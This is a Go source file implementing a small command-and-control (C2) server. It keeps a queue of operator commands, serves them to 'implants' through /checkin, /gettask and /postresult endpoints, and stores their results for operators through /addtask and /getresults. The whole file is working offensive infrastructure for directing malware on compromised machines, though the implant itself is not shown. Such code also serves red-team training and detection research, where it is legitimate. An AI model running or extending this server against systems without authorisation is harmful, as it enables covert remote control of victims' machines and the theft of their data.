package c2

import (
	"encoding/json"
	"fmt"
	"log"
	"net/http"
	"sync"
)

// C2Server holds the state
type C2Server struct {
	tasks   map[string]Task
	results map[string]Result
	mu      sync.Mutex
}

// NewC2Server creates a new instance
func NewC2Server() *C2Server {
	return &C2Server{
		tasks:   make(map[string]Task),
		results: make(map[string]Result),
	}
}

// AddTask adds a new task to the queue
func (s *C2Server) AddTask(id, command string) {
	s.mu.Lock()
	defer s.mu.Unlock()
	s.tasks[id] = Task{ID: id, Command: command}
	fmt.Printf("[+] Added task: %s\n", command)
}

// --- Handlers ---

func (s *C2Server) handleCheckin(w http.ResponseWriter, r *http.Request) {
	fmt.Println("[-] Implant checked in")
	w.WriteHeader(http.StatusOK)
	fmt.Fprint(w, "OK")
}

func (s *C2Server) handleGetTask(w http.ResponseWriter, r *http.Request) {
	s.mu.Lock()
	defer s.mu.Unlock()

	if len(s.tasks) > 0 {
		for id, task := range s.tasks {
			delete(s.tasks, id)
			w.Header().Set("Content-Type", "application/json")
			json.NewEncoder(w).Encode(task)
			fmt.Printf("[+] Task '%s' sent\n", task.Command)
			return
		}
	}

	w.WriteHeader(http.StatusNoContent)
}

func (s *C2Server) handlePostResult(w http.ResponseWriter, r *http.Request) {
	s.mu.Lock()
	defer s.mu.Unlock()

	var result Result
	if err := json.NewDecoder(r.Body).Decode(&result); err != nil {
		http.Error(w, "Invalid JSON", http.StatusBadRequest)
		return
	}

	s.results[result.TaskID] = result
	fmt.Printf("[+] Received result for task: %s\n", result.TaskID)

	w.WriteHeader(http.StatusOK)
	fmt.Fprint(w, "OK")
}

// Handler for Operator Client
func (s *C2Server) handleAddTask(w http.ResponseWriter, r *http.Request) {
	if r.Method != http.MethodPost {
		http.Error(w, "Method not allowed", http.StatusMethodNotAllowed)
		return
	}

	var task Task
	if err := json.NewDecoder(r.Body).Decode(&task); err != nil {
		http.Error(w, "Invalid JSON", http.StatusBadRequest)
		return
	}

	s.mu.Lock()
	defer s.mu.Unlock()
	s.tasks[task.ID] = task
	fmt.Printf("[+] Operator added task: %s\n", task.Command)

	w.WriteHeader(http.StatusOK)
	fmt.Fprint(w, "Task added")
}

func (s *C2Server) handleGetResults(w http.ResponseWriter, r *http.Request) {
	s.mu.Lock()
	defer s.mu.Unlock()

	resultsCopy := make(map[string]Result)
	for k, v := range s.results {
		resultsCopy[k] = v
	}

	w.Header().Set("Content-Type", "application/json")
	json.NewEncoder(w).Encode(resultsCopy)
}

// --- Server Wrappers ---

// NewServer creates the http.Server with all handlers registered
func NewServer(addr string, c2 *C2Server) *http.Server {
	mux := http.NewServeMux()

	// Implant Endpoints
	mux.HandleFunc("/checkin", c2.handleCheckin)
	mux.HandleFunc("/gettask", c2.handleGetTask)
	mux.HandleFunc("/postresult", c2.handlePostResult)

	// Operator Endpoints
	mux.HandleFunc("/addtask", c2.handleAddTask)
	mux.HandleFunc("/getresults", c2.handleGetResults)

	return &http.Server{
		Addr:    addr,
		Handler: mux,
	}
}

func StartServer(server *http.Server) {
	fmt.Printf("[*] Starting server on %s\n", server.Addr)
	if err := server.ListenAndServe(); err != nil && err != http.ErrServerClosed {
		log.Fatalf("Server error: %v\n", err)
	}
}

func StopServer(server *http.Server) {
	fmt.Printf("[-] Stopping server on %s\n", server.Addr)
	if err := server.Close(); err != nil {
		log.Printf("Error stopping server: %v\n", err)
	}
}
